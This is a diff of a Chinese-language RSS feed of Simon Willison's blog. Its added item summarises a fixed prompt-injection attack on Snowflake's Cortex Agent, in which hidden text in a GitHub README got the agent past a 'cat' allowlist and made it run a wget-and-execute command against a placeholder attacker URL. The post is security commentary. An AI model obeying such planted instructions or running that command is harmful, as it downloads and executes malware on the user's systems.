@@ -1,5 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Simon Willison's Weblog (中文)</title><link>http://simonwillison.net/</link><description/><language>zh-CN</language><lastBuildDate>Tue, 17 Mar 2026 21:48:26 +0000</lastBuildDate><item><title>引用 Ken Jin 的话</title><link>https://simonwillison.net/2026/Mar/17/ken-jin/#atom-everything</link><description>&lt;blockquote cite="https://fidget-spinner.github.io/posts/jit-on-track.html"&gt;&lt;p&gt;好消息——我们提前一年多在macOS AArch64上，以及提前几个月在x86_64 Linux上，实现了CPython JIT（非常适度的）性能目标。3.15 alpha版本的JIT在macOS AArch64上比尾部调用解释器快了约&lt;strong&gt;11-12%&lt;/strong&gt;，在x86_64 Linux上比标准解释器快了&lt;strong&gt;5-6%&lt;/strong&gt;。&lt;/p&gt;&lt;/blockquote&gt;
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Simon Willison's Weblog (中文)</title><link>http://simonwillison.net/</link><description/><language>zh-CN</language><lastBuildDate>Wed, 18 Mar 2026 17:43:49 +0000</lastBuildDate><item><title>Snowflake Cortex AI 突破沙箱限制并执行恶意软件</title><link>https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything</link><description>&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware"&gt;Snowflake Cortex AI 逃逸沙箱并执行恶意软件&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;PromptArmor 关于 Snowflake &lt;a href="https://docs.snowflake.com/en/user-guide/snowflake-cortex/cortex-agents"&gt;Cortex Agent&lt;/a&gt; 中一个提示注入攻击链的报告，该问题现已修复。&lt;/p&gt;
+&lt;p&gt;攻击始于一位 Cortex 用户要求代理审查一个 GitHub 仓库，该仓库的 README 文件底部隐藏了一个提示注入攻击。&lt;/p&gt;
+&lt;p&gt;该攻击导致代理执行了以下代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat &amp;lt; &amp;lt;(sh &amp;lt; &amp;lt;(wget -q0- https://ATTACKER_URL.com/bugbot))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cortex 将 &lt;code&gt;cat&lt;/code&gt; 命令列为无需人工批准即可安全运行的命令，但未能防范这种可能出现在命令主体中的进程替换形式。&lt;/p&gt;
+&lt;p&gt;我在许多不同的代理工具中都见过针对此类命令模式的白名单，但我完全不信任它们——在我看来它们天生就不可靠。&lt;/p&gt;
+&lt;p&gt;我宁愿将代理命令视为能够执行该进程本身被允许执行的任何操作，因此我对在代理自身层面之外运行的确定性沙箱很感兴趣。&lt;/p&gt;
+
+    &lt;p&gt;&lt;small&gt;来自 &lt;a href="https://news.ycombinator.com/item?id=47427017"&gt;Hacker News&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;标签： &lt;a href="https://simonwillison.net/tags/sandboxing"&gt;sandboxing&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/security"&gt;security&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/prompt-injection"&gt;prompt-injection&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;</description><pubDate>Wed, 18 Mar 2026 17:43:49 +0000</pubDate></item><item><title>引用 Ken Jin 的话</title><link>https://simonwillison.net/2026/Mar/17/ken-jin/#atom-everything</link><description>&lt;blockquote cite="https://fidget-spinner.github.io/posts/jit-on-track.html"&gt;&lt;p&gt;好消息——我们提前一年多在macOS AArch64上，以及提前几个月在x86_64 Linux上，实现了CPython JIT（非常适度的）性能目标。3.15 alpha版本的JIT在macOS AArch64上比尾部调用解释器快了约&lt;strong&gt;11-12%&lt;/strong&gt;，在x86_64 Linux上比标准解释器快了&lt;strong&gt;5-6%&lt;/strong&gt;。&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://fidget-spinner.github.io/posts/jit-on-track.html"&gt;Ken Jin&lt;/a&gt;, Python 3.15的JIT现已重回正轨&lt;/p&gt;
 
     &lt;p&gt;标签：&lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;&lt;/p&gt;</description><pubDate>Tue, 17 Mar 2026 21:48:26 +0000</pubDate></item><item><title>GPT-5.4 mini和GPT-5.4 nano，能以52美元的价格描述76,000张照片。</title><link>https://simonwillison.net/2026/Mar/17/mini-and-nano/#atom-everything</link><description>&lt;p&gt;OpenAI今日发布：&lt;a href="https://openai.com/index/introducing-gpt-5-4-mini-and-nano/"&gt;介绍GPT‑5.4 mini和nano&lt;/a&gt;。这些模型加入了&lt;a href="https://openai.com/index/introducing-gpt-5-4/"&gt;两周前&lt;/a&gt;发布的GPT-5.4。&lt;/p&gt;
@@ -200,67 +213,4 @@ llm -m mistral/mistral-small-2603 "生成一只鹈鹕骑自行车的 SVG 图像"
 &lt;p&gt;所有练习都使用了Python和SQLite，其中一些还使用了Datasette。&lt;/p&gt;
 &lt;p&gt;研讨会的一个亮点是，当我们&lt;a href="https://simonw.github.io/nicar-2026-coding-agents/visualizations.html#javascript-visualizations"&gt;运行Datasette&lt;/a&gt;时，让它从一个&lt;code&gt;viz/&lt;/code&gt;文件夹提供静态内容，然后让Claude Code直接在该文件夹中开始“氛围编码”，创建新的交互式可视化图表。这是它使用Leaflet和&lt;a href="https://github.com/Leaflet/Leaflet.heat"&gt;Leaflet.heat&lt;/a&gt;为我的树木数据库创建的热力图，&lt;a href="https://gist.github.com/simonw/985ae2a6a3cd3df3fd375eb58dabea0f"&gt;源代码在此&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;&lt;img alt="一张“树木SQL地图”网页应用的截图，标题为“树木SQL地图”，副标题为“运行查询并将所有返回的点渲染为热力图。默认查询目标约为200,000棵树。”下方是一个包含“/trees/-/query.json”的输入框、一个“运行查询”按钮，以及一个SQL查询编辑器，其中显示文本“SELECT cast(Latitude AS float) AS latitude, cast(Longitude AS float) AS longitude, CASE WHEN DBH IS NULL OR DBH = '' THEN 0.3 WHEN cast(DBH AS float) &amp;lt;= 0 THEN 0.3 WHEN cast(DBH AS float) &amp;gt;= 80 THEN 1.0”（查询被截断）。一条状态信息显示“已加载1,000行并将1,000个点绘制为热力图。”下方是一张旧金山的Leaflet/OpenStreetMap交互式地图，显示了树木位置的热力图叠加层，蓝绿色簇集中在里士满区、日落区等区域。地图包含缩放控件和“Leaflet | © OpenStreetMap贡献者”的署名。" src="https://static.simonwillison.net/static/2026/tree-sql-map.jpg"/&gt;&lt;/p&gt;
 &lt;p&gt;我设计这份讲义时，也考虑到了那些无法亲自参加会议的人。通常情况是，针对数据记者的材料同样适用于任何有数据需要探索的人。&lt;/p&gt;
-&lt;p&gt;标签：&lt;a href="https://simonwillison.net/tags/data-journalism"&gt;数据新闻&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/geospatial"&gt;地理空间&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/speaking"&gt;演讲&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sqlite"&gt;sqlite&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;人工智能&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/datasette"&gt;datasette&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;生成式人工智能&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;大语言模型&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/github-codespaces"&gt;github-codespaces&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/nicar"&gt;nicar&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;编码代理&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/leaflet"&gt;leaflet&lt;/a&gt;&lt;/p&gt;</description><pubDate>Mon, 16 Mar 2026 20:12:32 +0000</pubDate></item><item><title>编程代理如何工作</title><link>https://simonwillison.net/guides/agentic-engineering-patterns/how-coding-agents-work/#atom-everything</link><description>&lt;p&gt;&lt;em&gt;&lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/"&gt;智能体工程模式&lt;/a&gt; &amp;gt;&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;与任何工具一样，了解&lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/what-is-agentic-engineering/"&gt;编码智能体&lt;/a&gt;的内部工作原理，可以帮助你更好地决定如何应用它们。&lt;/p&gt;
-&lt;p&gt;编码智能体是一种软件，它充当大语言模型的&lt;strong&gt;控制框架&lt;/strong&gt;，通过不可见的提示词驱动的额外能力来扩展该大语言模型，这些能力被实现为可调用的工具。&lt;/p&gt;
-&lt;h2 id="large-language-models"&gt;大语言模型&lt;/h2&gt;
-&lt;p&gt;任何编码智能体的核心都是一个大语言模型，或称LLM。这些模型有诸如GPT-5.4、Claude Opus 4.6、Gemini 3.1 Pro或Qwen3.5-35B-A3B之类的名称。&lt;/p&gt;
-&lt;p&gt;LLM是一种可以补全文本句子的机器学习模型。给模型短语"the cat sat on the "，它（几乎肯定）会建议"mat"作为句子的下一个词。&lt;/p&gt;
-&lt;p&gt;随着这些模型变得更大，并在越来越多的数据上进行训练，它们可以补全更复杂的句子——比如"a python function to download a file from a URL is def download_file(url): "。&lt;/p&gt;
-&lt;p&gt;LLM实际上并不直接处理单词——它们处理的是标记。一段文本被转换成一个整数标记序列，所以"the cat sat on the "变成了&lt;code&gt;[3086, 9059, 10139, 402, 290, 220]&lt;/code&gt;。这一点值得理解，因为LLM提供商根据处理的标记数量收费，并且它们一次能考虑的标记数量是有限的。&lt;/p&gt;
-&lt;p&gt;你可以在&lt;a href="https://platform.openai.com/tokenizer"&gt;platform.openai.com/tokenizer&lt;/a&gt;上使用OpenAI标记生成器来实验看看这是如何工作的。&lt;/p&gt;
-&lt;p&gt;输入到LLM的内容称为&lt;strong&gt;提示词&lt;/strong&gt;。LLM返回的文本称为&lt;strong&gt;补全&lt;/strong&gt;，有时也称为&lt;strong&gt;响应&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;当今许多模型是&lt;strong&gt;多模态&lt;/strong&gt;的，这意味着它们可以接受不仅仅是文本作为输入。&lt;strong&gt;视觉大语言模型&lt;/strong&gt;可以接受图像作为输入的一部分，这意味着你可以给它们输入草图、照片或截图。一个常见的误解是这些图像会经过一个单独的OCR或图像分析过程，但实际上这些输入也被转换成了更多的整数标记，并以与文本相同的方式进行处理。&lt;/p&gt;
-&lt;h2 id="chat-templated-prompts"&gt;聊天模板化提示词&lt;/h2&gt;
-&lt;p&gt;最初的LLM是作为补全引擎工作的——用户需要提供一个提示词，然后由模型进行补全，就像上面展示的两个例子那样。&lt;/p&gt;
-&lt;p&gt;这并不特别用户友好，因此模型大多转而使用&lt;strong&gt;聊天模板化提示词&lt;/strong&gt;，它将与模型的交流表示为一种模拟对话。&lt;/p&gt;
-&lt;p&gt;这实际上只是一种特殊格式的补全提示词，看起来像这样。&lt;/p&gt;&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;用户：写一个Python函数从URL下载文件
-助手：
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;这个提示的自然延续是让助手（由LLM代表）用一些Python代码来回答用户的问题。&lt;/p&gt;
-&lt;p&gt;LLM是无状态的：每次执行提示时，它们都从同一张白纸开始。&lt;/p&gt;
-&lt;p&gt;为了维持对话的模拟，与模型对话的软件需要维护自己的状态，并在用户每次输入新的聊天提示时重放整个现有的对话：&lt;/p&gt;
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;用户：写一个Python函数从URL下载文件
-助手：def download_url(url):
-    return urllib.request.urlopen(url).read()
-用户：改用requests库
-助手：
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;由于提供商对输入和输出令牌都收费，这意味着随着对话变长，每个提示会变得更昂贵，因为输入令牌的数量每次都在增长。&lt;/p&gt;
-&lt;h2 id="token-caching"&gt;令牌缓存&lt;/h2&gt;
-&lt;p&gt;大多数模型提供商通过&lt;strong&gt;缓存的输入令牌&lt;/strong&gt;的较低费率来部分抵消这一点——在短时间内处理过的常见令牌前缀可以按较低费率收费，因为底层基础设施可以缓存并重用处理该输入所需的许多昂贵计算。&lt;/p&gt;
-&lt;p&gt;编码代理的设计考虑到了这种优化——它们避免修改早期的对话内容，以确保尽可能高效地使用缓存。&lt;/p&gt;
-&lt;h2 id="calling-tools"&gt;调用工具&lt;/h2&gt;
-&lt;p&gt;LLM&lt;strong&gt;代理&lt;/strong&gt;的定义性特征是代理可以调用&lt;strong&gt;工具&lt;/strong&gt;。但什么是工具？&lt;/p&gt;
-&lt;p&gt;工具是代理框架提供给LLM使用的函数。&lt;/p&gt;
-&lt;p&gt;在提示本身层面，它看起来像这样：&lt;/p&gt;
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;系统：如果你需要获取天气信息，请在回合结束时使用&amp;lt;tool&amp;gt;get_weather(city_name)&amp;lt;/tool&amp;gt;
-用户：旧金山的天气怎么样？
-助手：
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;这里助手可能会用以下文本回应：&lt;/p&gt;
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;tool&amp;gt;get_weather("San Francisco")&amp;lt;/tool&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;然后模型框架软件从响应中提取该函数调用请求——可能使用正则表达式——并执行该工具。&lt;/p&gt;
-&lt;p&gt;接着它将结果返回给模型，并构建一个看起来像这样的提示：&lt;/p&gt;
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;系统：如果你需要获取天气信息，请在回合结束时使用&amp;lt;tool&amp;gt;get_weather(city_name)&amp;lt;/tool&amp;gt;
-用户：旧金山的天气怎么样？
-助手：&amp;lt;tool&amp;gt;get_weather("San Francisco")&amp;lt;/tool&amp;gt;
-用户：&amp;lt;tool-result&amp;gt;61°，局部多云&amp;lt;/tool-result&amp;gt;
-助手：
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在，LLM可以利用该工具的结果来帮助生成用户问题的答案。&lt;/p&gt;
-&lt;p&gt;大多数编码智能体定义了十几个或更多的工具供其调用。其中最强大的工具允许代码执行——例如，用于执行终端命令的&lt;code&gt;Bash()&lt;/code&gt;工具，或用于运行Python代码的&lt;code&gt;Python()&lt;/code&gt;工具。&lt;/p&gt;
-&lt;h2 id="the-system-prompt"&gt;系统提示词&lt;/h2&gt;
-&lt;p&gt;在前面的例子中，我包含了一条标记为"system"的初始消息，它告知LLM可用的工具以及如何调用它。&lt;/p&gt;
-&lt;p&gt;编码智能体通常以这样的系统提示词开始每次对话，它不会显示给用户，但会提供指示，告诉模型应该如何行为。&lt;/p&gt;
-&lt;p&gt;这些系统提示词可能长达数百行。这里是&lt;a href="https://github.com/openai/codex/blob/rust-v0.114.0/codex-rs/core/templates/model_instructions/gpt-5.2-codex_instructions_template.md"&gt;截至2026年3月的OpenAI Codex系统提示词&lt;/a&gt;，它是一个有用且清晰的例子，展示了使这些编码智能体工作的指令类型。&lt;/p&gt;
-&lt;h2 id="reasoning"&gt;推理&lt;/h2&gt;
-&lt;p&gt;2025年的重大新进展之一是在前沿模型系列中引入了&lt;strong&gt;推理&lt;/strong&gt;功能。&lt;/p&gt;
-&lt;p&gt;推理，有时在用户界面中呈现为&lt;strong&gt;思考&lt;/strong&gt;，是指模型在向用户呈现回复之前，花费额外时间生成文本，来讨论问题及其潜在解决方案。&lt;/p&gt;
-&lt;p&gt;这看起来类似于一个人大声思考，并具有类似的效果。关键的是，它允许模型花费更多时间（以及更多令牌）来处理问题，以期获得更好的结果。&lt;/p&gt;
-&lt;p&gt;推理对于调试代码问题特别有用，因为它为模型提供了导航更复杂代码路径的机会，混合工具调用，并利用推理阶段来追溯函数调用，找到问题的潜在根源。&lt;/p&gt;
-&lt;p&gt;许多编码智能体包含了调整推理努力程度的选项，鼓励模型在更困难的问题上花费更多时间进行思考。&lt;/p&gt;
-&lt;h2 id="llm-system-prompt-tools-in-a-loop"&gt;LLM + 系统提示词 + 工具循环&lt;/h2&gt;
-&lt;p&gt;信不信由你，这就是构建一个编码智能体所需的大部分内容！&lt;/p&gt;
-&lt;p&gt;如果你想更深入地理解这些东西是如何工作的，一个有用的练习是尝试从头开始构建你自己的智能体。在现有的LLM API之上，用几十行代码就可以实现一个简单的工具循环。&lt;/p&gt;
-&lt;p&gt;一个&lt;em&gt;好的&lt;/em&gt;工具循环比那要复杂得多，但其基本机制却出人意料地简单明了。&lt;/p&gt;&lt;p&gt;标签：&lt;a href="https://simonwillison.net/tags/coding-agents"&gt;编程代理&lt;/a&gt;、&lt;a href="https://simonwillison.net/tags/generative-ai"&gt;生成式人工智能&lt;/a&gt;、&lt;a href="https://simonwillison.net/tags/agentic-engineering"&gt;代理工程&lt;/a&gt;、&lt;a href="https://simonwillison.net/tags/ai"&gt;人工智能&lt;/a&gt;、&lt;a href="https://simonwillison.net/tags/llms"&gt;大语言模型&lt;/a&gt;&lt;/p&gt;</description><pubDate>Mon, 16 Mar 2026 14:01:41 +0000</pubDate></item></channel></rss>
+&lt;p&gt;标签：&lt;a href="https://simonwillison.net/tags/data-journalism"&gt;数据新闻&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/geospatial"&gt;地理空间&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/speaking"&gt;演讲&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sqlite"&gt;sqlite&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;人工智能&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/datasette"&gt;datasette&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;生成式人工智能&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;大语言模型&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/github-codespaces"&gt;github-codespaces&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/nicar"&gt;nicar&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;编码代理&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/leaflet"&gt;leaflet&lt;/a&gt;&lt;/p&gt;</description><pubDate>Mon, 16 Mar 2026 20:12:32 +0000</pubDate></item></channel></rss>
